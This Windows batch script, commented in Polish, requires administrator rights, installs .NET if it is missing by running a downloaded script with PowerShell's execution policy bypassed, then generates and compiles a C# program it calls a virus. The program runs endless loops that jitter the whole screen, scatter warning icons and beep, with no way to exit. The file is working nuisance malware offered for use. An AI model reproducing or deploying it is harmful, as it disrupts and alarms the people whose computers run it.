@echo off
:: Wymuszamy uprawnienia admina
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] MUSISZ URUCHOMIC JAKO ADMIN!
    pause
    exit
)

title LOL-MAIN BUILDER
color 0B

:: Lokalizacja: Pulpit\lol-main
set "targetDir=%userprofile%\Desktop\lol-main"
if not exist "%targetDir%" mkdir "%targetDir%"
cd /d "%targetDir%"

:: 1. Cicha instalacja .NET, jeśli go nie ma
dotnet --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Brak .NET. Instalacja w folderze projektu...
    powershell -Command "Invoke-WebRequest -Uri 'https://dot.net/v1/dotnet-install.ps1' -OutFile 'dotnet-install.ps1'"
    powershell -ExecutionPolicy Bypass -File "dotnet-install.ps1" -Channel 6.0 -InstallDir "%targetDir%\dotnet"
    set "PATH=%PATH%;%targetDir%\dotnet"
)

:: 2. Inicjalizacja projektu
echo [*] Tworzenie projektu...
dotnet new winforms --force --name "Virus" >nul

:: 3. Wstrzykiwanie kodu C# (SHIT-MODE)
echo [*] Generowanie kodu...
(
echo using System;
echo using System.Drawing;
echo using System.Runtime.InteropServices;
echo using System.Threading;
echo using System.Windows.Forms;
echo.
echo class Hybrid {
echo     [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h^);
echo     [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int sx, int sy, uint op^);
echo     [DllImport("user32.dll")] static extern int GetSystemMetrics(int n^);
echo.
echo     [STAThread]
echo     static void Main(^) {
echo         new Thread((^) =^> { while(true) { Console.Beep(new Random(^).Next(300, 800^), 100^); Thread.Sleep(400^); } }).Start(^);
echo         IntPtr hdc = GetDC(IntPtr.Zero^);
echo         int w = GetSystemMetrics(0^), h = GetSystemMetrics(1^);
echo         Random r = new Random(^);
echo         while(true) {
echo             BitBlt(hdc, r.Next(-5, 6^), r.Next(-5, 6^), w, h, hdc, 0, 0, 0x00CC0020^);
echo             if(r.Next(10^) ^> 7^) Graphics.FromHdc(hdc^).DrawIcon(SystemIcons.Warning, r.Next(w^), r.Next(h^)^);
echo             Thread.Sleep(15^);
echo         }
echo     }
echo }
) > Program.cs

:: 4. Kompilacja
echo [*] Kompilacja...
dotnet build -c Release >nul

:: 5. WYCIĄGANIE PLIKU NA PULPIT (folder lol-main)
echo [*] Przenoszenie pliku EXE...
copy /y "%targetDir%\bin\Release\net6.0-windows\Virus.exe" "%targetDir%\ShitVirus.exe" >nul

:: Czyszczenie śmieci po kompilacji (opcjonalnie)
rmdir /s /q obj
rmdir /s /q bin

cls
echo ===================================================
echo   SUKCES!
echo   Twoj wirus jest tutaj: %targetDir%\ShitVirus.exe
echo ===================================================
pause
